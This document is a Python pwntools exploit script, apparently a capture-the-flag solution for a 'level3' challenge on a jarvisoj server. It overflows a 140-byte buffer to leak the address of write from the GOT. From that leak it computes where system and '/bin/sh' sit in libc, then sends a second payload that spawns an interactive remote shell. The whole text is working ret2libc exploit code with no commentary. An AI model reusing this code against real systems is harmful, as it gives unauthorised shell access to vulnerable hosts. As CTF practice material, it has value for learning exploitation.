from pwn import *

p = remote('pwn2.jarvisoj.com', 9879)
# p = process('./level3')
msg = p.recv(20)
print msg
vuln_addr = 0x0804844b

libc = ELF('libc-2.19.so')
level3 = ELF('level3')

libc_write_addr = libc.symbols['write']
libc_system_addr = libc.symbols['system']
level3_write_plt_addr = level3.plt['write']
level3_write_got_addr = level3.got['write']
print hex(level3_write_plt_addr)
print hex(level3_write_got_addr)

payload = 'A'* 140 + p32(level3_write_plt_addr) + p32(vuln_addr) + p32(1) + p32(level3_write_got_addr) + p32(4)

p.send(payload)

write_addr = u32(p.recv(4))
print hex(write_addr)
level3_system_addr = write_addr - (libc_write_addr - libc_system_addr)

libc_binsh_addr = next(libc.search('/bin/sh'))
print hex(libc_binsh_addr)
binsh_addr = write_addr - (libc_write_addr - libc_binsh_addr)
payload2 = 'A'* 140 + p32(level3_system_addr) + p32(vuln_addr) + p32(binsh_addr)

p.send(payload2)
p.interactive()
